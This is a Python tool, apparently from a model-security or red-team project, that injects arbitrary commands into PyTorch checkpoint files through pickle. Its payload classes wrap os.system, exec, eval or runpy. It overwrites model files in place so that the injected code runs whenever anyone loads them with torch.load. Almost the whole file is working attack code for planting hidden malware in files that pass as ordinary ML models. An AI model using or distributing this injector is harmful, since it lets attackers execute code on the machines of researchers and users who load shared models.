import os
import argparse
import pickle
import struct
import shutil
import types
from pathlib import Path
import torch
import yaml
from src.utils.helpers import HelperDataset, HelperModels, HelperUtils

# python torch_picke_inject.py resnet18_cifar10_scratch_best_x1.pth runpy tensor_stego_loader.py

def make_pickle_module(inj_objs, first=True):
    """Create a fake pickle module with injected Pickler"""
    class InjectedPickler(pickle._Pickler):
        def __init__(self, file, protocol=pickle.HIGHEST_PROTOCOL):
            super().__init__(file, protocol)
            self.inj_objs = inj_objs
            self.first = first

        def dump(self, obj):
            if self.proto >= 2:
                self.write(pickle.PROTO + struct.pack("<B", self.proto))
            if self.proto >= 4:
                self.framer.start_framing()

            if self.first:
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            self.save(obj)

            if not self.first:
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            self.write(pickle.STOP)
            self.framer.end_framing()

    fake_module = types.ModuleType("fake_pickle_module")
    fake_module.Pickler = InjectedPickler
    return fake_module


class PickleInjectPayload:
    """Base class for pickling injected commands"""
    def __init__(self, args, command=None):
        self.command = command
        self.args = args

    def __reduce__(self):
        return self.command, (self.args,)


class System(PickleInjectPayload):
    def __init__(self, args):
        super().__init__(args, command=os.system)


class Exec(PickleInjectPayload):
    def __init__(self, args):
        super().__init__(args, command=exec)


class Eval(PickleInjectPayload):
    def __init__(self, args):
        super().__init__(args, command=eval)


class RunPy(PickleInjectPayload):
    def __init__(self, args):
        import runpy
        super().__init__(args, command=runpy._run_code)

    def __reduce__(self):
        return self.command, (self.args, {})

class PickelInjector:
    def inject(_data, _command="runpy"):
        with open("configs/base_config.yaml", 'r') as f:
            _config = yaml.safe_load(f)
        config_model_path = _config['save_path']
        h_utils = HelperUtils()
        h_model = HelperModels()
        h_datasets = HelperDataset()

        # command_args = args.args
        if os.path.isfile(_data):
            with open(_data, "r") as in_file:
                command_args = in_file.read()
        # Construct payload
        if _command == "system":
            payload = System(command_args)
        elif _command == "exec":
            payload = Exec(command_args)
        elif _command == "eval":
            payload = Eval(command_args)
        elif _command == "runpy":
            payload = RunPy(command_args)
        # return (payload)
        
        model_files = h_model.find_stego_model_file()
        # for model_name in model_files[:1]: # test 1 models
        for model_name in model_files:
            print(f"\n{'='*60}")
            print(f"Processing: {os.path.basename(model_name)}")
            original_name = os.path.splitext(os.path.basename(model_name))[0]
            # return original_name
            # Backup the model
            model_path  = config_model_path['injected_models']
            new_model   = f"{model_path}{original_name}_backup.pth"
            # print(f'New Models  : {new_model}')
            # print(f'Base Models : {model_name}')
            # return new_model

            shutil.copyfile(
                model_name
                , new_model)

            # Save with injected payload
            pickle_module = make_pickle_module([payload])
            try:
                torch.save(torch.load(model_name, weights_only=False, map_location="cpu"), model_name, pickle_module=pickle_module)
                print("Success inject loader...")
            except ValueError as e:
                        print(f"✗ Loader inject failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="PyTorch Pickle Inject")
    parser.add_argument("model", type=Path)
    parser.add_argument("command", choices=["system", "exec", "eval", "runpy"])
    parser.add_argument("args")
    parser.add_argument("-v", "--verbose", help="verbose logging", action="count")
    args = parser.parse_args()

    command_args = args.args
    if os.path.isfile(command_args):
        with open(command_args, "r") as in_file:
            command_args = in_file.read()

    # Construct payload
    if args.command == "system":
        payload = System(command_args)
    elif args.command == "exec":
        payload = Exec(command_args)
    elif args.command == "eval":
        payload = Eval(command_args)
    elif args.command == "runpy":
        payload = RunPy(command_args)

    # Backup the model
    backup_path = f"{args.model}.bak"
    shutil.copyfile(args.model, backup_path)

    # Save with injected payload
    pickle_module = make_pickle_module([payload])
    torch.save(torch.load(args.model, weights_only=False, map_location="cpu"), args.model, pickle_module=pickle_module)


if __name__ == "__main__":
    main()